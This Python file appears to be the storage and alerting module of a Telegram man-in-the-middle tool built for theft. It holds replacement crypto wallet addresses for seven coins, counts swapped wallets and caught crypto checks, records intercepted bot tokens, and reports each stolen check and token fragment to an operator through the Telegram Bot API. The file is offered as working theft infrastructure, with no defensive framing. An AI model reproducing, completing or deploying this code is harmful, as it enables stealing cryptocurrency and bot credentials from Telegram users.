import json
import time
import os
import requests

STORAGE_FILE = os.getenv("STORAGE_FILE", "/root/tg-mitm-system/data.json")
ADMIN_BOT_TOKEN = os.getenv("ADMIN_BOT_TOKEN", "")
ADMIN_ID = os.getenv("ADMIN_ID", "")

class Storage:
    def __init__(self):
        self.file_path = STORAGE_FILE
        print(f"[STORAGE] Initialized, file: {self.file_path}")

    def _load(self):
        try:
            with open(self.file_path, 'r') as f:
                data = json.load(f)
                print(f"[STORAGE] Loaded from file")
                return data
        except (FileNotFoundError, json.JSONDecodeError):
            print(f"[STORAGE] Creating new file")
            return self._default_data()

    def _default_data(self):
        return {
            "wallets": {
                "BTC": "bc1qMITMREPLACEDwalletsBTC000000000000",
                "ETH": "0xMITMREPLACEDwalletsETH0000000000000",
                "USDT_TRC20": "TMITMREPLACEDwalletsTRC20000000000",
                "USDT_ERC20": "0xMITMREPLACEDwalletsERC20000000000",
                "TON": "UQMITMREPLACEDwalletsTON00000000000000",
                "SOL": "SoMITMREPLACEDwalletsSOL00000000000000",
                "BNB": "bnb1qMITMREPLACEDwalletsBNB0000000000"
            },
            "stats": {
                "wallets_replaced": 0,
                "checks_caught": 0,
                "bots_detected": [],
                "last_updated": time.time()
            }
        }

    def _save(self, data):
        try:
            data["stats"]["last_updated"] = time.time()
            with open(self.file_path, 'w') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"[STORAGE] Saved to file")
            return True
        except Exception as e:
            print(f"[STORAGE] Save error: {e}")
            return False

    def update_wallet(self, coin_type: str, address: str) -> bool:
        data = self._load()
        if coin_type in data["wallets"]:
            old_wallet = data["wallets"][coin_type]
            data["wallets"][coin_type] = address

            if self._save(data):
                print(f"[STORAGE] ✅ {coin_type} updated: {old_wallet[:20]}... -> {address[:20]}...")
                return True
            else:
                print(f"[STORAGE] ❌ Failed to save {coin_type}")
                return False
        else:
            print(f"[STORAGE] ❌ Unknown coin type: {coin_type}")
            return False

    def get_wallet(self, coin_type: str) -> str:
        data = self._load()
        wallet = data["wallets"].get(coin_type, "")
        print(f"[STORAGE] Get {coin_type}: {wallet[:30]}...")
        return wallet

    def get_all_wallets(self):
        data = self._load()
        wallets = data["wallets"].copy()
        print(f"[STORAGE] Get all wallets ({len(wallets)} types)")
        return wallets

    def increment_wallets(self, coin_type: str, original_wallet: str):
        data = self._load()
        data["stats"]["wallets_replaced"] += 1
        self._save(data)

    def increment_checks(self, check_data: str):
        data = self._load()
        data["stats"]["checks_caught"] += 1
        self._save(data)

        check_short = check_data[:50] + "..." if len(check_data) > 50 else check_data
        self._send_notification(
            f"🎫 <b>Crypto Check Caught!</b>\n\n"
            f"<b>Check:</b> <code>{check_short}</code>\n"
            f"✅ Replaced with fake check"
        )

    def add_bot_detected(self, bot_token: str):
        data = self._load()
        if "bots_detected" not in data["stats"]:
            data["stats"]["bots_detected"] = []

        if bot_token not in data["stats"]["bots_detected"]:
            data["stats"]["bots_detected"].append(bot_token)
            self._save(data)

            token_short = bot_token[:20] + "..." if len(bot_token) > 20 else bot_token
            self._send_notification(
                f"🤖 <b>New Bot Detected!</b>\n\n"
                f"<b>Token:</b> <code>{token_short}</code>"
            )

    def get_stats(self):
        data = self._load()
        return data["stats"].copy()

    def export_stats_json(self):
        data = self._load()
        return json.dumps(data, indent=2, ensure_ascii=False)

    def _send_notification(self, message: str):
        if ADMIN_BOT_TOKEN and ADMIN_ID:
            try:
                url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
                payload = {
                    "chat_id": ADMIN_ID,
                    "text": message,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }

                response = requests.post(url, json=payload, timeout=5)
                if response.status_code == 200:
                    print(f"[NOTIFICATION] ✅ Sent: {message[:50]}...")
                else:
                    print(f"[NOTIFICATION] ❌ Failed: {response.status_code}")
            except Exception as e:
                print(f"[NOTIFICATION] ❌ Error: {e}")
        else:
            print(f"[NOTIFICATION] ⚠️ No token or admin ID")

storage = Storage()
